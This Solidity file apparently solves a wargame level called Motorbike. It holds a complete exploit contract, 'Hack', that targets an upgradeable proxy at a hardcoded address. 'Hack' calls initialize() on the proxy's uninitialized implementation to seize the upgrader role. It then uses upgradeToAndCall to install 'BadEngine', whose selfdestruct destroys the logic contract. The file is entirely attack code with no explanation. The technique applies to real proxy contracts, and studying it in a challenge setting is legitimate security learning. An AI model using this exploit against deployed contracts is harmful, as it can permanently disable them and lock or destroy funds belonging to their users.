// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

interface Motorbike {
    fallback() external payable;
}

interface Engine {
    function upgrader() external view returns (address);

    function horsePower() external view returns (uint256);

    function initialize() external;

    function upgradeToAndCall(address newImplementation, bytes memory data)
        external
        payable;
}

contract Hack {
    struct AddressSlot {
        address value;
    }
    AddressSlot public implementationSlot; // slot No.0 (No.1 is proxy address)

    Motorbike proxy = Motorbike(0x4A676f70EFA65F623c9dBD30d8E4cfbe3AA41567);

    //_targetSlotValue = await web3.eth.getStorageAt(0x4A676f70EFA65F623c9dBD30d8E4cfbe3AA41567, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
    bytes32 internal constant _targetSlotValue =
        0x00000000000000000000000000a48143b3504c2bfc2f58351506d8ac67f0eda1;

    function attack() external {
        assembly {
            // store the target slot value into the simulated implementation slot.
            sstore(0, _targetSlotValue)
        }
        address engine = implementationSlot.value;

        (bool success, ) = engine.call(abi.encodeWithSignature("initialize()"));
        require(success, "Hacker: engine initialize failed");
        address badEngine = address(new BadEngine());
        (success, ) = engine.call(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                badEngine,
                abi.encodeWithSignature("killSelf()")
            )
        );
        require(success, "Hacker: upgrade failed");
    }
}

contract BadEngine {
    function killSelf() external {
        selfdestruct(address(0));
    }
}
